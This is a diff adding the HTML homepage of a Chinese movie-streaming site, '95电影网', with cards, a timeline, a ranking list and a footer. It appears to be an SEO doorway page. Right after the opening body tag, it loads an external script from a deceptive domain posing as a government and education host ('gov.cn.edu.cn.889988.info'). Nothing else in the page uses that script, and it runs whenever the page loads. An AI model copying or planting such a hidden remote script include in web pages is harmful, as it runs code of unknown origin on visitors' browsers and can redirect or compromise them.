@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>95电影网 | 九五影视·经典与新片同步更新</title>
+<meta name="keywords" content="95电影网,九五影视,在线看电影,经典老片,新片速递,影视大全">
+<meta name="description" content="95电影网（九五影视）专注经典老片与新片同步更新，提供电影、剧集、综艺、动漫等高清资源在线观看，分类清晰、播放流畅，是影迷追剧看片的优选平台。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://95dianyingwang-zh.github.io">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎬</text></svg>">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --crimson:#c0392b;
+    --crimson-light:#e74c3c;
+    --gold:#f39c12;
+    --ink:#222;
+    --paper:#faf7f2;
+    --card:#fff;
+    --muted:#7f8c8d;
+    --shadow:0 6px 24px rgba(192,57,43,.10);
+  }
+  html{scroll-behavior:smooth}
+  body{
+    font-family:"Georgia","Songti SC","SimSun","WenQuanYi Micro Hei",serif;
+    background:var(--paper);color:var(--ink);line-height:1.8;
+  }
+  .wrap{max-width:1120px;margin:0 auto;padding:0 22px}
+
+  /* Header */
+  header{
+    background:linear-gradient(90deg,#1a1a1a,#2c2c2c);
+    position:sticky;top:0;z-index:100;border-bottom:3px solid var(--gold);
+  }
+  .nav{display:flex;align-items:center;justify-content:space-between;height:72px}
+  .brand{display:flex;align-items:center;gap:12px;text-decoration:none;color:#fff}
+  .brand-mark{
+    font-size:26px;font-weight:900;color:var(--gold);
+    border:2px solid var(--gold);border-radius:8px;padding:2px 8px;
+    font-family:Arial,sans-serif;
+  }
+  .brand h1{font-size:20px;letter-spacing:2px;font-weight:700}
+  .brand small{display:block;font-size:11px;color:#aaa;letter-spacing:3px;font-family:Arial,sans-serif}
+  .menu{display:flex;gap:4px;list-style:none}
+  .menu a{
+    display:block;padding:10px 18px;color:#eee;text-decoration:none;
+    font-size:15px;letter-spacing:1px;border-radius:4px;transition:.3s;
+  }
+  .menu a:hover{background:var(--crimson);color:#fff}
+  .burger{display:none;cursor:pointer;color:#fff;font-size:26px}
+
+  /* Hero */
+  .hero{
+    background:
+      linear-gradient(rgba(26,26,26,.82),rgba(26,26,26,.82)),
+      repeating-linear-gradient(45deg,transparent,transparent 20px,rgba(243,156,18,.04) 20px,rgba(243,156,18,.04) 40px),
+      #1a1a1a;
+    color:#fff;padding:100px 0;
+    border-bottom:5px solid var(--gold);
+  }
+  .hero-inner{max-width:720px}
+  .kicker{color:var(--gold);font-size:14px;letter-spacing:6px;text-transform:uppercase;margin-bottom:18px;font-family:Arial,sans-serif}
+  .hero h2{font-size:clamp(34px,6vw,64px);font-weight:900;line-height:1.15;margin-bottom:22px}
+  .hero h2 i{font-style:normal;color:var(--gold)}
+  .hero p{font-size:18px;color:#ccc;margin-bottom:36px}
+  .btn-row{display:flex;gap:16px;flex-wrap:wrap}
+  .btn{
+    display:inline-block;padding:14px 34px;text-decoration:none;font-weight:700;
+    letter-spacing:2px;border-radius:4px;transition:.3s;font-family:Arial,sans-serif;
+  }
+  .btn-main{background:var(--crimson);color:#fff;border:2px solid var(--crimson)}
+  .btn-main:hover{background:var(--gold);border-color:var(--gold);color:#1a1a1a}
+  .btn-outline{border:2px solid #fff;color:#fff}
+  .btn-outline:hover{background:#fff;color:#1a1a1a}
+
+  /* Section */
+  section{padding:84px 0}
+  .sec-title{text-align:center;margin-bottom:54px}
+  .sec-title .en{color:var(--gold);font-size:13px;letter-spacing:5px;font-family:Arial,sans-serif;text-transform:uppercase}
+  .sec-title h3{font-size:clamp(26px,4vw,38px);font-weight:900;margin:8px 0;letter-spacing:1px}
+  .sec-title .rule{width:50px;height:3px;background:var(--crimson);margin:12px auto 0}
+
+  /* Timeline */
+  .timeline{position:relative;max-width:860px;margin:0 auto;padding-left:40px}
+  .timeline::before{
+    content:"";position:absolute;left:12px;top:0;bottom:0;width:3px;
+    background:linear-gradient(var(--crimson),var(--gold));
+  }
+  .tl-item{position:relative;margin-bottom:36px;background:var(--card);
+    border-radius:10px;padding:26px 30px;box-shadow:var(--shadow);transition:.3s}
+  .tl-item:hover{transform:translateX(8px)}
+  .tl-item::before{
+    content:"";position:absolute;left:-34px;top:30px;width:16px;height:16px;
+    border-radius:50%;background:var(--gold);border:3px solid #fff;box-shadow:0 0 0 3px var(--crimson);
+  }
+  .tl-item .yr{color:var(--crimson);font-weight:900;font-size:15px;letter-spacing:2px;font-family:Arial,sans-serif}
+  .tl-item h4{font-size:20px;margin:6px 0 8px}
+  .tl-item p{color:#555;font-size:15px}
+
+  /* Cards */
+  .grid-4{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:26px}
+  .card{background:var(--card);border-radius:10px;overflow:hidden;box-shadow:var(--shadow);transition:.35s}
+  .card:hover{transform:translateY(-10px);box-shadow:0 18px 40px rgba(192,57,43,.2)}
+  .card-img{height:180px;display:grid;place-items:center;font-size:64px;color:#fff;position:relative}
+  .c1{background:linear-gradient(135deg,#c0392b,#8e2d22)}
+  .c2{background:linear-gradient(135deg,#f39c12,#d68910)}
+  .c3{background:linear-gradient(135deg,#2c3e50,#1a252f)}
+  .c4{background:linear-gradient(135deg,#16a085,#0e6655)}
+  .card-img small{position:absolute;bottom:10px;left:14px;font-size:12px;background:rgba(0,0,0,.5);padding:3px 10px;border-radius:3px;font-family:Arial,sans-serif}
+  .card-body{padding:20px 22px}
+  .card-body h4{font-size:18px;margin-bottom:6px}
+  .card-body p{color:var(--muted);font-size:14px}
+
+  /* Quote */
+  .quote-wrap{background:#1a1a1a;color:#eee;padding:76px 0;border-top:3px solid var(--gold);border-bottom:3px solid var(--gold)}
+  .quote{max-width:820px;margin:0 auto;text-align:center;padding:0 22px}
+  .quote .mark{font-size:80px;color:var(--gold);line-height:.6;font-family:Arial}
+  .quote p{font-size:clamp(18px,3vw,26px);font-style:italic;margin:20px 0;line-height:1.7}
+  .quote cite{color:var(--gold);font-style:normal;font-size:14px;letter-spacing:3px;font-family:Arial,sans-serif}
+
+  /* Film strip list */
+  .strip{background:var(--card)}
+  .film-row{
+    display:flex;gap:24px;align-items:center;padding:22px 0;border-bottom:1px dotted #ddd;
+    transition:.25s;
+  }
+  .film-row:last-child{border-bottom:none}
+  .film-row:hover{background:#fdf6ec;padding-left:14px}
+  .film-no{
+    flex-shrink:0;width:52px;height:52px;border-radius:6px;background:#1a1a1a;color:var(--gold);
+    display:grid;place-items:center;font-weight:900;font-size:18px;font-family:Arial;
+  }
+  .film-info{flex:1}
+  .film-info h5{font-size:18px}
+  .film-info span{color:var(--muted);font-size:13px}
+  .film-rate{
+    flex-shrink:0;background:var(--crimson);color:#fff;font-weight:900;
+    padding:6px 14px;border-radius:4px;font-family:Arial;
+  }
+
+  /* Links */
+  .link-block{max-width:880px;margin:0 auto;text-align:center}
+  .link-block a{
+    display:inline-block;margin:8px;padding:11px 22px;background:var(--card);
+    color:#333;text-decoration:none;border:1px solid #e0d8cc;border-radius:4px;
+    font-size:14px;transition:.3s;
+  }
+  .link-block a:hover{border-color:var(--crimson);color:var(--crimson);background:#fdf6ec}
+
+  /* Footer */
+  footer{background:#111;color:#999;padding:60px 0 28px}
+  .foot-top{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:34px;margin-bottom:36px}
+  .foot-top h5{color:var(--gold);font-size:16px;margin-bottom:16px;letter-spacing:2px}
+  .foot-top ul{list-style:none}
+  .foot-top ul li{margin-bottom:10px}
+  .foot-top a{color:#999;text-decoration:none;font-size:14px;transition:.2s}
+  .foot-top a:hover{color:var(--gold)}
+  .foot-brand-big{font-size:24px;font-weight:900;color:#fff;letter-spacing:3px;margin-bottom:12px}
+  .copy{text-align:center;border-top:1px solid #333;padding-top:24px;font-size:13px;color:#666}
+  .copy a{color:var(--gold);text-decoration:none}
+
+  @media(max-width:820px){
+    .menu{position:fixed;top:72px;left:0;right:0;flex-direction:column;background:#1a1a1a;
+      padding:18px;transform:translateY(-200%);transition:.4s;visibility:hidden}
+    .menu.open{transform:translateY(0);visibility:visible}
+    .menu a{border-radius:0;border-bottom:1px solid #333}
+    .burger{display:block}
+    .hero{padding:70px 0}
+    .timeline{padding-left:30px}
+    .foot-top{grid-template-columns:1fr 1fr;gap:26px}
+    section{padding:60px 0}
+  }
+  @media(max-width:480px){
+    .foot-top{grid-template-columns:1fr}
+    .film-row{flex-wrap:wrap}
+    .film-rate{margin-left:auto}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="brand" href="#">
+      <span class="brand-mark">95</span>
+      <div><h1>95电影网</h1><small>JIUWU FILM</small></div>
+    </a>
+    <ul class="menu" id="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#channel">频道</a></li>
+      <li><a href="#classic">经典年代</a></li>
+      <li><a href="#top">热门榜单</a></li>
+      <li><a href="#news">影讯</a></li>
+      <li><a href="#links">导航</a></li>
+    </ul>
+    <div class="burger" onclick="document.getElementById('menu').classList.toggle('open')">☰</div>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="wrap hero-inner">
+    <div class="kicker">Online Movie Hub</div>
+    <h2>从九五年代<br>到 <i>95电影网</i></h2>
+    <p>重温胶片质感的老片，同步追更院线新作。95电影网（九五影视）以"经典 + 新片"双线并行的片库策略，为影迷打造一个有温度、有质感的观影空间。</p>
+    <div class="btn-row">
+      <a class="btn btn-main" href="#classic">走进经典</a>
+      <a class="btn btn-outline" href="#top">查看榜单</a>
+    </div>
+  </div>
+</section>
+
+<section id="channel">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="en">Channel</div>
+      <h3>内容频道</h3>
+      <div class="rule"></div>
+    </div>
+    <div class="grid-4">
+      <div class="card"><div class="card-img c1"><span>🎞️</span><small>MOVIE</small></div><div class="card-body"><h4>院线电影</h4><p>动作、喜剧、爱情、悬疑，全类型覆盖。</p></div></div>
+      <div class="card"><div class="card-img c2"><span>📺</span><small>DRAMA</small></div><div class="card-body"><h4>热播剧集</h4><p>国产、美剧、韩剧，追剧不断更。</p></div></div>
+      <div class="card"><div class="card-img c3"><span>🎌</span><small>ANIME</small></div><div class="card-body"><h4>动漫专区</h4><p>国漫日漫剧场版，二次元聚集地。</p></div></div>
+      <div class="card"><div class="card-img c4"><span>🎤</span><small>VARIETY</small></div><div class="card-body"><h4>综艺娱乐</h4><p>真人秀、脱口秀、选秀，轻松解压。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<div class="quote-wrap">
+  <div class="quote">
+    <div class="mark">“</div>
+    <p>电影是现实的渐近线。每一部作品，都是一段被封存的时光，等待被重新打开。</p>
+    <cite>— 95电影网 · 观影信条</cite>
+  </div>
+</div>
+
+<section id="classic">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="en">Classic Era</div>
+      <h3>经典年代放映室</h3>
+      <div class="rule"></div>
+    </div>
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="yr">1995</div>
+        <h4>九五年的光影记忆</h4>
+        <p>那一年华语电影百花齐放，港片的黄金余晖与内地新锐力量交汇，留下无数值得反复回味的经典。</p>
+      </div>
+      <div class="tl-item">
+        <div class="yr">2000s</div>
+        <h4>新千年大片时代</h4>
+        <p>数字摄影与商业类型片崛起，动作、科幻、奇幻全面升级，视觉奇观与叙事深度并行。</p>
+      </div>
+      <div class="tl-item">
+        <div class="yr">2010s</div>
+        <h4>流媒体与口碑时代</h4>
+        <p>观影方式变革，优质内容井喷，小成本佳作与高概念大片共同塑造多元格局。</p>
+      </div>
+      <div class="tl-item">
+        <div class="yr">2026</div>
+        <h4>当下与未来</h4>
+        <p>院线新片即时上线，经典修复计划持续推进，95电影网陪你同步见证每一个新片段落。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="top" style="background:#f3ede4">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="en">Top Ranking</div>
+      <h3>本周热门榜单</h3>
+      <div class="rule"></div>
+    </div>
+    <div class="film-row">
+      <div class="film-no">01</div>
+      <div class="film-info"><h5>无间风云</h5><span>犯罪 · 悬疑 · 2026</span></div>
+      <div class="film-rate">9.3</div>
+    </div>
+    <div class="film-row">
+      <div class="film-no">02</div>
+      <div class="film-info"><h5>海上钢琴师 · 重制版</h5><span>文艺 · 修复 · 经典</span></div>
+      <div class="film-rate">9.5</div>
+    </div>
+    <div class="film-row">
+      <div class="film-no">03</div>
+      <div class="film-info"><h5>长安谜案</h5><span>古装 · 剧集 · 36集</span></div>
+      <div class="film-rate">8.7</div>
+    </div>
+    <div class="film-row">
+      <div class="film-no">04</div>
+      <div class="film-info"><h5>云端之城</h5><span>动画 · 国漫 · 剧场版</span></div>
+      <div class="film-rate">8.9</div>
+    </div>
+    <div class="film-row">
+      <div class="film-no">05</div>
+      <div class="film-info"><h5>极限玩家</h5><span>综艺 · 真人秀 · 更新中</span></div>
+      <div class="film-rate">8.2</div>
+    </div>
+  </div>
+</section>
+
+<section id="news" class="strip">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="en">News</div>
+      <h3>影讯速递</h3>
+      <div class="rule"></div>
+    </div>
+    <div class="grid-4">
+      <div class="card"><div class="card-body"><h4>📌 国庆档票房观察</h4><p>多类型新片集中上映，市场热度持续走高。</p></div></div>
+      <div class="card"><div class="card-body"><h4>📌 经典4K修复计划</h4><p>十余部影史佳作陆续完成修复并上线。</p></div></div>
+      <div class="card"><div class="card-body"><h4>📌 国际电影节前瞻</h4><p>华语作品入围名单公布，备受期待。</p></div></div>
+      <div class="card"><div class="card-body"><h4>📌 观影指南：十月片单</h4><p>编辑精选本月不容错过的观影清单。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="links">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="en">Friends</div>
+      <h3>友情导航</h3>
+      <div class="rule"></div>
+    </div>
+    <div class="link-block">
+      <a href="#">最新电影</a>
+      <a href="#">热播剧集</a>
+      <a href="#">经典老片</a>
+      <a href="#">高分榜单</a>
+      <a href="#">动漫专区</a>
+      <a href="#">综艺娱乐</a>
+      <a href="#">影评资讯</a>
+      <a href="#">票房数据</a>
+      <a href="#">明星资料</a>
+      <a href="#">影视原声</a>
+      <a href="#">电影节展</a>
+      <a href="#">观影社区</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-top">
+      <div>
+        <div class="foot-brand-big">95电影网</div>
+        <p>聚焦经典与新片，做有温度的影视内容平台。电影、剧集、动漫、综艺一应俱全。</p>
+      </div>
+      <div><h5>频道</h5><ul>
+        <li><a href="#channel">院线电影</a></li>
+        <li><a href="#channel">热播剧集</a></li>
+        <li><a href="#channel">动漫专区</a></li>
+        <li><a href="#channel">综艺娱乐</a></li>
+      </ul></div>
+      <div><h5>帮助</h5><ul>
+        <li><a href="#">使用指南</a></li>
+        <li><a href="#">画质设置</a></li>
+        <li><a href="#">常见问题</a></li>
+        <li><a href="#">意见反馈</a></li>
+      </ul></div>
+      <div><h5>关于</h5><ul>
+        <li><a href="#home">平台简介</a></li>
+        <li><a href="#">商务合作</a></li>
+        <li><a href="#">隐私政策</a></li>
+        <li><a href="#">免责声明</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">
+      © 2026 <a href="https://95dianyingwang-zh.github.io">95电影网（95dianyingwang-zh.github.io）</a> 保留所有权利 · 本站内容仅供影视信息交流分享
+    </div>
+  </div>
+</footer>
+
+<script>
+  document.querySelectorAll('.menu a').forEach(function(a){
+    a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open')});
+  });
+</script>
+</body>
+</html>
